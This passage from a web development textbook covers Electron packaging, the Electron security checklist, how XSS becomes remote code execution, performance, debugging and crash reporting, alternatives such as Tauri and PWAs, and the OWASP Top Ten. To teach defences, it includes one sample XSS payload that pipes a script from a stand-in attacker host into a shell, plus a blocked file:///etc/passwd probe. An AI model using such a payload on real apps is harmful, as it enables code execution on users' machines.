- Per-user installs avoid administrator prompts and allow silent updates; per-machine installs suit IT-managed environments.
- Installers register shortcuts, URL schemes and file associations; uninstallers usually keep user data.

> **Practice**
>
> 1. *(Beginner)* Build an NSIS installer (Windows) or a DMG (macOS) for Bookshelf Desktop, install it, and find where the program files and the `userData` folder are on disk.
> 2. *(Intermediate)* Produce a Linux AppImage and a `.deb` package; install the deb and verify that the `bookshelf://` scheme and the `.desktop` entry work (`xdg-open bookshelf://book/1`).
> 3. *(Interview)* "A large company wants to deploy your Electron app to 5,000 managed Windows machines with no user prompts and controlled updates. What would you change in your distribution?" *Hint:* compare per-machine MSI with per-user NSIS or Squirrel, consider disabling in-app updates, and think about how IT tools push new versions.

#### The Electron Security Checklist

**Why Electron security is different.** In a browser, an XSS bug lets the attacker act as the user *on that website*. In an Electron app, the same bug runs code in a process that sits next to Node.js and native APIs. Depending on configuration, it can read files, run programs and install malware. Electron apps also often display untrusted content: chat messages, documents, Markdown, web pages, book descriptions from an API. The Electron project maintains an official security checklist. Following it reduces a web bug to a contained web bug.

The model is **defense in depth**, like a building with an outer fence, locked doors, and a safe inside: each layer assumes the one before it may fail.

```text
  Untrusted content (remote pages, user data, deep links)
        |
  [1] Do not load it, or load it without privileges (no Node, sandbox, isolation)
        |
  [2] Restrict what it can do: CSP, navigation and window-open limits, permission handler
        |
  [3] Narrow preload API exposed through contextBridge
        |
  [4] Main process validates sender and arguments of every IPC message
        |
  [5] Hardened binary (fuses, ASAR integrity) and an up-to-date Electron
        |
  Operating system
```

**The checklist** (adapted from the official Electron security documentation):

| # | Recommendation | Why |
|---|---|---|
| 1 | Load only secure content (HTTPS, WSS; no HTTP) | Prevents network attackers from injecting code |
| 2 | Do not enable Node.js integration for remote content (`nodeIntegration: false`, the default) | XSS would become remote code execution |
| 3 | Keep context isolation enabled (default) | Page scripts cannot tamper with the preload world |
| 4 | Keep the process sandbox enabled (default) | Limits what a compromised renderer can do at OS level |
| 5 | Handle permission requests (`session.setPermissionRequestHandler`) | By default, Electron grants requests for camera, microphone, notifications and others |
| 6 | Do not disable `webSecurity` | It enforces the same-origin policy |
| 7 | Define a Content Security Policy | Blocks injected and third-party scripts (17.1) |
| 8 | Do not enable `allowRunningInsecureContent` | Prevents HTTP scripts on HTTPS pages |
| 9 | Do not enable experimental features | Less-tested code paths |
| 10 | Do not use `enableBlinkFeatures` | Same reason |
| 11 | `<webview>`: do not use `allowpopups` | Prevents uncontrolled new windows |
| 12 | Verify `<webview>` options and parameters before creation | Prevents attackers from enabling Node in a webview |
| 13 | Disable or limit navigation (`will-navigate`) | A window that navigates to an attacker's page keeps its preload and IPC access |
| 14 | Disable or limit creation of new windows (`setWindowOpenHandler`) | Same reason |
| 15 | Do not use `shell.openExternal` with untrusted content | `file:`, `smb:` or custom-scheme URLs can execute programs |
| 16 | Use a current version of Electron | Chromium and Node.js vulnerabilities are fixed only in supported versions |
| 17 | Validate the sender of all IPC messages | Subframes or navigated pages may send messages |
| 18 | Avoid the `file://` protocol; prefer custom protocols | `file://` pages have broad file access semantics |
| 19 | Check which fuses you can change | Disables features attackers abuse, such as `ELECTRON_RUN_AS_NODE` |
| 20 | Do not expose Electron APIs to untrusted web content | Preload APIs must be narrow (16.1) |

**Applying it in code.** Several items can be enforced globally, for every page the app ever creates:

```javascript
// main/security.js: applied once at startup
const { app, session, shell } = require('electron');

const APP_ORIGIN = 'app://bookshelf';
const EXTERNAL_ALLOWED = new Set(['https:', 'mailto:']);

app.on('web-contents-created', (_event, contents) => {
  // 13. No navigation away from the app's own origin
  contents.on('will-navigate', (event, navigationUrl) => {
    if (new URL(navigationUrl).origin !== APP_ORIGIN) event.preventDefault();
  });

  // 14 + 15. No new Electron windows from content; open safe links in the browser instead
  contents.setWindowOpenHandler(({ url }) => {
    const { protocol } = new URL(url);
    if (EXTERNAL_ALLOWED.has(protocol)) shell.openExternal(url);
    return { action: 'deny' };
  });

  // 12. Webviews: strip preloads and force secure settings, or block them entirely
  contents.on('will-attach-webview', (event, webPreferences) => {
    delete webPreferences.preload;
    webPreferences.nodeIntegration = false;
    webPreferences.contextIsolation = true;
    event.preventDefault();          // Bookshelf does not use <webview> at all
  });
});

app.whenReady().then(() => {
  // 5. Grant only the permissions the app needs, only to its own origin
  session.defaultSession.setPermissionRequestHandler((webContents, permission, callback) => {
    const origin = new URL(webContents.getURL()).origin;
    callback(origin === APP_ORIGIN && ['notifications', 'clipboard-sanitized-write'].includes(permission));
  });

  // 7. CSP as a response header for every response (or a <meta> tag in index.html)
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [
          "default-src 'self'; script-src 'self'; connect-src 'self' https://api.bookshelf.example.com; " +
          "img-src 'self' https: data:; object-src 'none'; base-uri 'none'",
        ],
      },
    });
  });
});
```

**Keeping up.** The checklist is not a one-off task. Re-check it when adding a feature that displays new kinds of content. Upgrade Electron at least within the three supported major versions, and audit dependencies (17.1), since every npm package in the main process runs with full privileges. Tools such as **Electronegativity** scan an Electron codebase for common misconfigurations and can run in CI.

**Key Takeaways**

- In Electron, an XSS bug can become code execution on the user's machine, so web security mistakes cost more.
- Keep the secure defaults: no Node integration, context isolation and sandbox on, `webSecurity` on.
- Enforce navigation limits, window-open handlers, permission handlers and a CSP for every `webContents` via `web-contents-created`.
- Validate IPC senders and arguments, never pass untrusted URLs to `shell.openExternal`, and avoid `file://`.
- Stay on a supported Electron version, flip unneeded fuses off, and scan the codebase in CI.

> **Practice**
>
> 1. *(Beginner)* Go through the 20 items for your Bookshelf Desktop code and mark each as done, not applicable or missing.
> 2. *(Intermediate)* Add the global `web-contents-created` handlers above and test them: from the DevTools console, try `location.href = 'https://example.com'` and `window.open('file:///etc/passwd')` and confirm both are blocked.
> 3. *(Interview)* "Electron grants permission requests by default. Why is that a problem, and how do you fix it?" *Hint:* think about what a compromised or third-party page could silently access, and how a session-level permission handler with an origin check restores control.

#### Node Integration and Remote Content Risks

**Why this deserves its own topic.** Most serious Electron vulnerabilities come from one combination: content the developer does not fully control, running in a renderer that has more power than a browser tab. Seeing exactly how an innocent-looking bug becomes "attacker runs programs on your computer" explains why the checklist's defaults exist and why they must never be turned off for convenience.

**How XSS becomes remote code execution.** Imagine an old version of Bookshelf Desktop configured as many early tutorials suggested, which renders book descriptions from the API as HTML:

```javascript
// INSECURE configuration, often found in old code and tutorials
new BrowserWindow({
  webPreferences: { nodeIntegration: true, contextIsolation: false, sandbox: false },
});

// renderer: description comes from the API and may contain user-submitted text
card.innerHTML = `<h2>${book.title}</h2><div>${book.description}</div>`; // XSS bug
```

An attacker submits a book whose description is:

```html
<img src="x" onerror="require('child_process').exec('curl https://evil.example/p.sh | sh')">
```

```text
 Attacker -> bookshelf API -> description stored
                                     |
 Victim opens Bookshelf Desktop -> renderer inserts description with innerHTML
                                     |
                         onerror handler runs in the page
                                     |
   Browser tab:     no `require` -> limited to the website (bad, but contained)
   Insecure Electron: require('child_process') exists -> shell command runs
                                     |
                   attacker's script runs with the user's privileges:
                   reads files, steals tokens, installs malware
```

The same escalation happened in real products. A well-known 2020 case in Discord's desktop app chained an XSS-like bug in embedded content with disabled context isolation into remote code execution. Several messaging and note-taking apps have had similar reports, where rendering a crafted message or Markdown file was enough.

**Why each default blocks a step.**

| Setting | Attack step it blocks |
|---|---|
| `nodeIntegration: false` | Injected script cannot call `require` |
| `contextIsolation: true` | Injected script cannot reach the preload's `require`/`ipcRenderer` or tamper with its built-ins (prototype pollution) |
| `sandbox: true` | Even a renderer exploit (a Chromium bug) lands in an OS-level sandbox |
| Narrow preload API + IPC validation | Injected script can only call the specific, validated actions the UI needs |
| CSP without `'unsafe-inline'` | The inline `onerror` handler is not executed in the first place |

**Sources of untrusted content.** In a desktop app, it is not only remote websites:

- data from your own API that contains user input (book descriptions, reviews, chat messages);
- files the user opens (Markdown, HTML, SVG, PDFs, `.bookshelf` files from others);
- deep links (16.2) and command-line arguments;
- third-party scripts: analytics, ads, CDNs, embedded widgets;
- web pages loaded with `loadURL('https://...')` and any page they navigate to.

**Loading remote content safely.** Some apps show web content: a help page, an OAuth login page, the publisher's website for a book. Rules:

- Do not load remote pages into a window that has your preload and IPC. Use a separate window or `WebContentsView` without a preload, with the sandbox, and with its own `session` (`partition: 'remote-content'`) so it cannot read the app's cookies or storage.
- Better still, open external sites in the user's real browser with `shell.openExternal` after checking the URL scheme.
- For login, use the system browser with a deep-link redirect (16.2) and PKCE (10.3), instead of an embedded window where the app could see the user's password.
- A "thin wrapper" app that just calls `loadURL('https://app.example.com')` has the attack surface of that whole website and its dependencies. Give it no preload, or a minimal one, and enforce navigation limits.

```javascript
// A sandboxed viewer for external content: no preload, separate session, no navigation out
function openPublisherPage(url) {
  const { protocol, hostname } = new URL(url);
  if (protocol !== 'https:' || !ALLOWED_HOSTS.has(hostname)) return;

  const viewer = new BrowserWindow({
    width: 900, height: 700,
    webPreferences: {
      sandbox: true,
      contextIsolation: true,
      nodeIntegration: false,
      partition: 'remote-content',   // separate cookies, cache and storage from the app
      // no preload: this page gets no bridge to main
    },
  });
  viewer.loadURL(url);
}
```

**Safe rendering in the app itself.** The UI rules of the web apply with higher stakes. Render with `textContent` or a framework's escaped bindings (React escapes by default, 14.1), sanitize unavoidable HTML with a library such as DOMPurify, and render Markdown with raw HTML disabled.

**Key Takeaways**

- With Node integration (or broken isolation), any XSS in an Electron renderer becomes code execution on the user's machine.
- Each default (no Node, isolation, sandbox) and each extra layer (narrow preload, IPC validation, CSP) blocks a different step of that chain.
- Untrusted content includes your own API data, opened files, deep links and third-party scripts, not just websites.
- Show remote pages without a preload, in a sandboxed window with a separate session, or open them in the system browser.
- Render text safely (`textContent`, escaped templates, sanitization), exactly as on the web.

> **Practice**
>
> 1. *(Beginner)* Find the `innerHTML` uses in a small Electron project (or the Bookshelf renderer) and replace each with `textContent` or sanitized HTML.
> 2. *(Intermediate)* In a throwaway app with `nodeIntegration: true` and `contextIsolation: false`, reproduce the book description attack with a harmless payload (for example writing a file to the temp folder). Then restore the secure defaults and add a CSP, and show at which layer the attack now fails.
> 3. *(Interview)* "Your product manager wants the desktop app to be a thin wrapper that loads the production website with `loadURL`, plus a preload that gives it file access. What are the risks and what would you propose?" *Hint:* consider every script that can run on that origin, navigation to other sites, the scope of the preload API, and the alternatives (local bundle, narrow capabilities, PWA).

#### Memory and Performance Optimization

**Why Electron apps feel heavy.** Users often complain that Electron apps start slowly and use a lot of memory. Part of this is structural: a Chromium browser and a Node.js runtime start every time, and each window is a separate renderer process with its own V8 heap. But much of the slowness people notice comes from avoidable choices: loading every module at startup, synchronous work in the main process, too many windows, leaks. The structural cost is fixed. The avoidable part is where you can make a large difference.

**Measure first.**

| Tool | Measures |
|---|---|
| `app.getAppMetrics()` | CPU and memory of every Electron process (main, renderers, GPU, utility) |
| `process.getProcessMemoryInfo()`, `process.memoryUsage()` | Memory of the current process |
| DevTools Performance and Memory panels (renderer) | Frames, long tasks, heap snapshots, detached DOM nodes |
| `electron --inspect=9229 .` + `chrome://inspect` | Main-process CPU profiles and heap snapshots |
| `contentTracing` module / Perfetto | Detailed traces across all processes |
| Timestamps (`performance.now()`) around startup phases | Where startup time goes |

```javascript
// main.js: log memory per process type every minute (development builds)
setInterval(() => {
  for (const m of app.getAppMetrics()) {
    console.log(`${m.type.padEnd(10)} pid=${m.pid} ` +
      `mem=${Math.round(m.memory.workingSetSize / 1024)} MB cpu=${m.cpu.percentCPUUsage.toFixed(1)}%`);
  }
}, 60_000);
```

**Faster startup.**

```text
 Startup timeline (typical, before optimization)
 |-- Electron/Chromium init --|-- main.js requires --|-- window created --|-- renderer loads JS --|-- data --|
                                ^ many large modules    ^ shown only when    ^ one huge bundle,      ^ API call
                                  loaded eagerly          everything is done   parsed before paint
```

1. **Show something quickly.** Create the window with `show: false`, show it on `ready-to-show`, and give it a `backgroundColor`. Render the app shell first and load data afterwards.
2. **Load less in main before the window.** Every `require` is synchronous file I/O plus parsing. Defer modules needed only later (updater, analytics, export code):
   ```javascript
   // Load the heavy module only when the user exports
   ipcMain.handle('books:export-pdf', async (event, books) => {
     const { renderPdf } = require('./pdf-export'); // loaded on first use, then cached
     return renderPdf(books);
   });
   ```
3. **Bundle main, preload and renderer code** with Vite, webpack or esbuild. One bundled file loads faster than hundreds of `node_modules` files, and unused code is removed. Enable code splitting in the renderer (14.5).
4. **Use V8's code cache.** Bundled renderer code loaded with standard script tags benefits from Chromium's compilation cache on subsequent starts; avoid patterns that defeat it, such as `eval`.
5. **Do not wait on the network before first paint.** Show cached data from local storage, then refresh.

**Keep the main process responsive.** As described in 16.1, the main process serves every window. Avoid all `*Sync` APIs in main (`readFileSync`, `execSync`, `dialog.showMessageBoxSync`, `ipcRenderer.sendSync` from renderers), and move CPU-heavy work (search indexing, image processing, parsing large files) to a **utility process** or a renderer **Web Worker**.

**Reduce memory.**

- **Fewer renderers.** Each `BrowserWindow` costs a full renderer process. Reuse windows, hide rather than destroy windows that reopen often (trading memory for speed deliberately), and do not create invisible windows just to run background code (use a utility process).
- **Avoid leaks.** Typical sources: `ipcRenderer.on` listeners added on every component mount and never removed (return an unsubscribe function, as in 16.1); `ipcMain` handlers or `Map`s that keep references to closed windows; timers in closed views; large caches without limits.
- **Throttle hidden windows.** Chromium slows timers and rendering in background windows (`backgroundThrottling: true`, the default). Disable it only for windows that really must keep running at full speed (audio, real-time collaboration).
- **Virtualize long lists.** Rendering 10,000 book cards creates 10,000 DOM subtrees. Render only the visible rows (14.5).
- **Release native resources.** Destroy `Tray`, `WebContentsView` and `Notification` objects you no longer need, and close database connections.

**Battery and CPU.** Desktop users notice fans and battery drain. Avoid polling (use events and `powerMonitor`), stop animations when windows are hidden (`document.visibilityState`), and cancel periodic work while on battery or asleep.

**Key Takeaways**

- Part of Electron's cost (Chromium + Node.js, one process per window) is fixed; much of the perceived slowness is avoidable.
- Measure with `app.getAppMetrics()`, DevTools profiles for renderer and main, and tracing.
- Speed up startup by showing the window early, deferring `require`s, bundling code and not blocking on the network.
- Keep the main process free of synchronous and CPU-heavy work; use utility processes and Web Workers.
- Save memory with fewer windows, listener cleanup, background throttling, virtualized lists and bounded caches.

> **Practice**
>
> 1. *(Beginner)* Add the `getAppMetrics` logger to Bookshelf Desktop, open and close the settings window ten times, and check whether memory returns to its starting level.
> 2. *(Intermediate)* Measure time from launch to first meaningful paint (log timestamps in main and renderer). Apply three optimizations from this topic, measure again, and report which one helped most.
> 3. *(Interview)* "Users say your Electron app freezes for a moment whenever they open the export dialog, in every window at once. Where would you look first?" *Hint:* a freeze across all windows points at a component they all share; think about synchronous work there.

#### Debugging and Crash Reporting

**Why debugging is different.** An Electron app runs code in several processes, so there is no single debugger that sees everything by default. And once shipped, the app runs on thousands of machines you cannot access, with different OS versions, GPUs, antivirus software and data. You need tools for both situations: interactive debugging during development and automatic, privacy-respecting reports from the field.

**Debugging the renderer.** Each window has Chrome DevTools, exactly as in a browser (6.4): `win.webContents.openDevTools()`, the View > Toggle Developer Tools menu role, or `Ctrl+Shift+I`. Elements, Console, Network, Sources with breakpoints, Performance and Memory all work. React or Vue DevTools can be loaded as Chrome extensions in development builds (`session.defaultSession.extensions.loadExtension(path)` in recent versions).

**Debugging the main process.** The main process is a Node.js process, so it uses the Node.js inspector (11.1):

```bash
# Start Electron with the inspector enabled for the main process
npx electron --inspect=9229 .        # or --inspect-brk to pause on the first line
# then open chrome://inspect in Chrome and click "inspect" under Remote Target
```

Or debug both processes from VS Code:

```jsonc
// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Electron: Main",
      "type": "node",
      "request": "launch",
      "cwd": "${workspaceFolder}",
      "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron",
      "windows": { "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron.cmd" },
      "args": [".", "--remote-debugging-port=9223"]
    },
    {
      "name": "Electron: Renderer",
      "type": "chrome",
      "request": "attach",
      "port": 9223,
      "webRoot": "${workspaceFolder}/src/renderer"
    }
  ],
  "compounds": [{ "name": "Electron: All", "configurations": ["Electron: Main", "Electron: Renderer"] }]
}
```

Remember that the inspector flags are disabled in release builds if you flip the `EnableNodeCliInspectArguments` fuse (see Packaging above), which is what you want: nobody should be able to attach a debugger to the installed app to steal its data.

**Logging.** `console.log` in main goes to the terminal, which does not exist for an installed app. Use a logging library that writes to files in the platform's log folder, with rotation:

```javascript
// main.js
const log = require('electron-log/main');
log.initialize();                       // also lets preload/renderer log through IPC
log.transports.file.level = 'info';     // file: ~/Library/Logs/Bookshelf/main.log on macOS, etc.
log.transports.file.maxSize = 5 * 1024 * 1024; // rotate at 5 MB

log.info('Starting Bookshelf', app.getVersion(), process.versions.electron);
```

Log versions, important state changes and errors; never log tokens, passwords or document contents. A Help > "Show Logs" menu item that calls `shell.openPath(log.transports.file.getFile().path)` makes support requests easier.

**Catching errors.** Unhandled errors must at least be logged, and the app should decide deliberately whether to continue:

```javascript
// main.js
process.on('uncaughtException', (err) => {
  log.error('Uncaught exception in main', err);
  dialog.showErrorBox('Bookshelf encountered an error', 'The application will restart.');
  app.relaunch();                        // main state may be inconsistent: restart cleanly
  app.exit(1);
});
process.on('unhandledRejection', (reason) => log.error('Unhandled rejection in main', reason));

// Renderer crashes, out-of-memory and kills
app.on('render-process-gone', (_event, webContents, details) => {
  log.error('Renderer gone', details.reason, details.exitCode); // 'crashed', 'oom', 'killed', ...
  if (details.reason !== 'clean-exit') webContents.reload();    // offer a fresh page
});
app.on('child-process-gone', (_event, details) => log.error('Child process gone', details));
```

**Native crash reports.** JavaScript handlers cannot catch native crashes (a segfault in Chromium, a GPU driver bug, a native module). Electron includes Chromium's **Crashpad**, which writes a **minidump** (a compact snapshot of threads, stacks and loaded modules) when any process crashes and can upload it:

```javascript
// main.js: start as early as possible, before app 'ready'
const { crashReporter } = require('electron');

crashReporter.start({
  submitURL: 'https://crash.bookshelf.example.com/minidump', // your server or a service
  uploadToServer: settings.sendCrashReports,                  // respect the user's consent
  compress: true,
  globalExtra: { channel: 'stable' },                         // extra metadata on every report
});
```

Minidumps are analyzed with debug symbols for the exact Electron version (Electron publishes them) and for your native modules. Services such as Sentry (`@sentry/electron`), Backtrace or BugSplat collect JavaScript errors from all processes and native minidumps, symbolicate them, attach breadcrumbs (recent log events) and group similar crashes. Upload **source maps** for your bundled code (9.3) so stack traces point to original source lines.

**Privacy and consent.** Crash reports can include file paths with user names, memory contents and URLs. Ask for consent (or at least allow opting out), strip personal data, document what is sent and comply with applicable law (GDPR in the EU).

**Reproducing issues.** **Electron Fiddle** is a small app for writing a minimal Electron reproduction and running it against any Electron version. It is the standard way to check whether a bug comes from your code or from Electron, and to bisect between versions. For automated end-to-end tests of the real app, Playwright can launch Electron and drive both its windows and its main process (17.2).

**Key Takeaways**

- Renderers use Chrome DevTools; the main process uses the Node.js inspector (`--inspect`, `chrome://inspect`, VS Code).
- Installed apps need file logging with rotation in the platform log folder, without sensitive data.
- Handle `uncaughtException`, `unhandledRejection`, `render-process-gone` and `child-process-gone` deliberately.
- Crashpad minidumps capture native crashes; start `crashReporter` early and symbolicate with matching symbols and source maps.
- Collect crash data only with consent and minimal personal data; reproduce Electron bugs with Electron Fiddle.

> **Practice**
>
> 1. *(Beginner)* Set breakpoints in both the main process (`ipcMain.handle('books:export')`) and the renderer (the export button handler) and step through one export from VS Code.
> 2. *(Intermediate)* Add `electron-log`, the error handlers above and a Help > Show Logs menu item. Trigger a renderer crash with `process.crash()` from a debug-only menu item and verify that it is logged and the window reloads.
> 3. *(Interview)* "Users report that your desktop app sometimes closes without any error message, and your JavaScript error tracking shows nothing. How would you investigate?" *Hint:* think about which failures JavaScript handlers cannot see, what Crashpad records, and which process types might be the ones disappearing.

#### Alternatives: Tauri, NW.js and Desktop PWAs

**Why look beyond Electron.** Electron's main weaknesses are size and memory, both caused by bundling a full Chromium and Node.js with every app. Other projects make different trade-offs: use the browser engine the operating system already has, use a different back-end language, or skip native packaging entirely and rely on the user's browser. Knowing them lets you choose deliberately instead of by habit.

**Tauri.** Tauri (1.0 in 2022, 2.0 in 2024) keeps the web front end but changes the rest:

- The UI runs in the **operating system's WebView**: WebView2 (Chromium-based Edge) on Windows, WKWebView (WebKit) on macOS, WebKitGTK on Linux. No Chromium is bundled.
- The back end is written in **Rust**, compiled to a small native binary. There is no Node.js runtime (a Node.js "sidecar" process is possible but optional).
- Front end and back end communicate through **commands**: Rust functions callable from JavaScript, much like `ipcMain.handle`.
- Security is **deny by default**: the front end can use only the APIs and plugins explicitly listed in capability files.
- Tauri 2 also builds **iOS and Android** apps from the same project.

```rust
// src-tauri/src/lib.rs: a command callable from the front end
#[tauri::command]
fn count_unread(books: Vec<Book>) -> usize {
    books.iter().filter(|b| !b.read).count()       // runs in native Rust code
}

#[derive(serde::Deserialize)]
struct Book { id: u32, title: String, read: bool }

pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())         // official plugin: native dialogs
        .invoke_handler(tauri::generate_handler![count_unread]) // register commands
        .run(tauri::generate_context!())
        .expect("error while running Bookshelf");
}
```

```javascript
// Front end (any framework)
import { invoke } from '@tauri-apps/api/core';
const unread = await invoke('count_unread', { books }); // arguments serialized as JSON
```

```jsonc
// src-tauri/capabilities/default.json: what the main window may use
{
  "identifier": "default",
  "windows": ["main"],
  "permissions": ["core:default", "dialog:allow-open", "dialog:allow-save"]
}
```

Trade-offs: installers of a few megabytes instead of around a hundred and lower memory use. In exchange, the app renders in **three different engines**, so you are back to cross-browser testing (WebKitGTK on Linux in particular lags in features and performance), and the team needs Rust for anything beyond the plugins.

**NW.js.** NW.js (formerly node-webkit, 2011) predates Electron and also bundles Chromium and Node.js. Its distinctive design is that Node.js and the DOM share **one context**: page scripts can call `require('fs')` directly, and the entry point can be an HTML file.

```json
{
  "name": "bookshelf",
  "main": "index.html",
  "window": { "width": 1000, "height": 700, "title": "Bookshelf" }
}
```

```html
<!-- index.html in NW.js: Node.js directly in the page -->
<script>
  const fs = require('fs');                         // works: no separate main process needed
  document.body.textContent = fs.readdirSync('.').join(', ');
</script>
```

This is convenient for prototypes and kiosk-style tools, but it is exactly the configuration that Electron's security model avoids (see the security checklist above). NW.js has a smaller community and ecosystem than Electron, and is mainly found in legacy projects.

**Desktop PWAs.** A Progressive Web App (15.2) can be installed from Chrome or Edge on Windows, macOS, Linux and ChromeOS. It opens in its own window and appears in the Start menu, Dock or app launcher. Safari on macOS can also add web apps to the Dock. Several web APIs target the desktop:

| Capability | Web API / manifest member | Support |
|---|---|---|
| Own window, title-bar area | `display: standalone`, `display_override: ["window-controls-overlay"]` | Chromium browsers |
| Open and save local files | File System Access API (`showOpenFilePicker`, `showSaveFilePicker`) | Chromium browsers |
| Open files from the OS | `file_handlers` in the manifest + `launchQueue` | Chromium browsers |
| Custom URL schemes | `protocol_handlers` (`web+bookshelf://`) | Chromium browsers, Firefox (partly) |
| App badge | `navigator.setAppBadge(3)` | Chromium browsers, Safari |
| Notifications, offline | Notifications API, Push API, service worker | Broad |

```json
{
  "name": "Bookshelf",
  "start_url": "/",
  "display": "standalone",
  "display_override": ["window-controls-overlay"],
  "file_handlers": [
    { "action": "/open", "accept": { "application/json": [".bookshelf"] } }
  ],
  "protocol_handlers": [
    { "protocol": "web+bookshelf", "url": "/link?u=%s" }
  ]
}
```

Desktop PWAs need no installer, no code signing and no update mechanism: the user always runs the deployed version. They also inherit the browser's security sandbox. In return, they can do only what browsers allow: no arbitrary file system access, no tray icon, no global shortcuts, no native menus, and feature support that varies by browser.

**Others worth knowing.** **Wails** (Go back end, system WebView), **Neutralinojs** (very small, system WebView, lightweight back end), and frameworks that do not use web UIs at all: **Flutter** desktop, **React Native for Windows and macOS**, **.NET MAUI** and **Qt**.

**Comparison.**

| | Electron | Tauri | NW.js | Desktop PWA |
|---|---|---|---|---|
| Rendering engine | Bundled Chromium | OS WebView (WebView2, WKWebView, WebKitGTK) | Bundled Chromium | User's browser |
| Back-end language | JavaScript (Node.js) | Rust (+ optional sidecar) | JavaScript (Node.js) | None (server only) |
| Typical installer size | ~80-150 MB | ~3-15 MB | ~80-150 MB | None |
| Memory use | Higher | Lower | Higher | Shared with the browser |
| Rendering consistency | Identical everywhere | Varies by OS engine | Identical everywhere | Varies by browser |
| OS integration | Very broad | Broad (via plugins) | Broad | Limited to web APIs |
| Security model | Isolation + sandbox, opt-in hardening | Deny-by-default capabilities | Node and DOM share a context | Browser sandbox |
| Updates | App updater (16.2) | Built-in updater plugin | Manual / custom | Instant on deploy |
| Ecosystem and maturity | Largest; VS Code, Slack, Discord | Growing quickly | Small, legacy | Web platform |
| Mobile from same project | No | Yes (Tauri 2) | No | Yes |

**Choosing.** Choose **Electron** when you need deep OS integration, consistent rendering, a Node.js back end and the largest ecosystem, and can accept the size. Choose **Tauri** when size and memory matter, the team can write some Rust, and you can test on three engines. Choose a **desktop PWA** when browser capabilities are enough and instant updates and zero installation matter most. Many products combine them: a PWA for most users and an Electron or Tauri app for those who need offline files, a tray icon or global shortcuts, sharing one front-end codebase.

**Key Takeaways**

- Tauri uses the OS WebView and a Rust back end: much smaller and lighter, but three rendering engines to test and Rust to learn.
- NW.js bundles Chromium and Node.js in a shared context: convenient but less secure; mostly legacy.
- Desktop PWAs install from the browser with no packaging or signing and update instantly, but only use web APIs.
- Compare on engine, back-end language, size, memory, rendering consistency, OS integration, security model and updates.
- Share the front end across delivery options and pick the shell each audience needs.

> **Practice**
>
> 1. *(Beginner)* Turn the Bookshelf web front end into an installable desktop PWA with `file_handlers` for `.bookshelf` files, and install it from Chrome or Edge.
> 2. *(Intermediate)* Build a minimal Tauri version of Bookshelf Desktop with one Rust command and the dialog plugin. Compare installer size, idle memory and startup time with the Electron version, and note any rendering differences between the operating systems you can test.
> 3. *(Interview)* "Your team is starting a new desktop app. How would you decide between Electron, Tauri and a PWA?" *Hint:* list the required OS features, rendering consistency needs, team languages, size and memory constraints, update and distribution requirements, and how mature each ecosystem is for the plugins you need.

<a id="17-security-quality-and-deployment"></a>
## 17. Security, Quality and Deployment

Earlier chapters built the bookshelf application one piece at a time: an Express API (Chapter 12), MongoDB and Redis storage (Chapter 13), a React front end (Chapter 14) and mobile and desktop clients (Chapters 15 and 16). This last chapter covers what turns working code into a service you can trust in production. It covers defending the application against attacks (17.1), showing that it works and keeping it maintainable with tests and tooling (17.2), and building, deploying, observing and scaling it (17.3). Several of these topics came up briefly in earlier chapters; here they are brought together into one systematic view, because in production a single weak link (an unescaped string, an untested migration, a leaked key) undoes all the other work.

<a id="171-web-application-security"></a>
### 17.1 Web Application Security

A web application is reachable by anyone on the Internet, including people who will send it inputs its authors never imagined. This subchapter starts with the OWASP Top Ten as a map of the most common weaknesses. It then covers the major attack classes one at a time (cross-site scripting, request forgery, injection and cross-origin misconfiguration) and the platform defences against them (Content Security Policy and other security headers). It ends with two operational concerns: keeping secrets out of code, and keeping third-party dependencies free of known vulnerabilities.

#### The OWASP Top Ten

**Why a list of risks.** Most successful attacks on web applications do not use new techniques. They reuse a small set of well-known mistakes: a missing authorization check, a string concatenated into a query, a default password left in place. If developers know these patterns, they can recognise and avoid most vulnerabilities before the code ships. The **OWASP Top Ten** is the best-known catalogue of them.

**What OWASP is.** The *Open Worldwide Application Security Project* is a non-profit foundation that publishes free security guides, tools and standards. Its Top Ten is an awareness document, updated every few years from vulnerability data contributed by security firms and from a community survey. It is not a complete standard: for full requirements, OWASP publishes the *Application Security Verification Standard* (ASVS), and for practical guidance the *Cheat Sheet Series*. Still, the Top Ten is the shared vocabulary of the field. Auditors, interviewers and job adverts refer to it constantly.

An analogy: the Top Ten is like a list of the ten most common causes of house fires. It does not teach you to build a house, but if you check every item, you have removed most of the risk.

**The current list.** The 2025 edition reorganised the 2021 list, which is still widely cited. Both are shown so you can recognise either:

| 2025 | Category | 2021 equivalent | What goes wrong |
|---|---|---|---|
| A01 | Broken Access Control | A01 (+ A10 SSRF merged in) | Users act outside their permissions: reading another user's data, calling admin endpoints, making the server fetch internal URLs |
| A02 | Security Misconfiguration | A05 | Default credentials, verbose error pages, open cloud buckets, missing security headers |
| A03 | Software Supply Chain Failures | A06 Vulnerable and Outdated Components | Vulnerable or malicious dependencies, compromised build tools |
| A04 | Cryptographic Failures | A02 | Data sent without TLS, weak password hashing, hard-coded keys |
| A05 | Injection | A03 | Untrusted input interpreted as code: SQL, NoSQL, OS commands, XSS |
| A06 | Insecure Design | A04 | Flaws in the design itself, such as an unlimited password-reset flow |
| A07 | Authentication Failures | A07 | Credential stuffing, weak session handling, missing MFA |
| A08 | Software or Data Integrity Failures | A08 | Trusting unsigned updates, insecure deserialisation, unverified CDN scripts |
| A09 | Security Logging and Alerting Failures | A09 | Attacks go unnoticed because nothing is logged or nobody is alerted |
| A10 | Mishandling of Exceptional Conditions | New | Errors that fail open, leak details or leave inconsistent state |

**Where this book covers each one.**

| Category | Defences | Sections |
|---|---|---|
| Broken Access Control | Server-side authorization on every request, deny by default, scope queries to the owner | 10.3, this section |
| Security Misconfiguration | Security headers, hardened defaults, no stack traces in responses | 12.2, 17.1 |
| Supply Chain | Lockfiles, auditing, update automation | 11.2, 17.1 |
| Cryptographic Failures | HTTPS everywhere, bcrypt/argon2, secret management | 10.1, 10.3, 17.1 |
| Injection (incl. XSS) | Parameterised queries, output encoding, CSP | 17.1 |
| Authentication Failures | Sessions, JWT handling, MFA, rate limiting | 10.2, 10.3, 10.4 |
| Logging and Alerting | Structured logs, metrics, alerts | 11.6, 17.3 |
| Exceptional Conditions | Central error handling, failing closed | 12.2 |

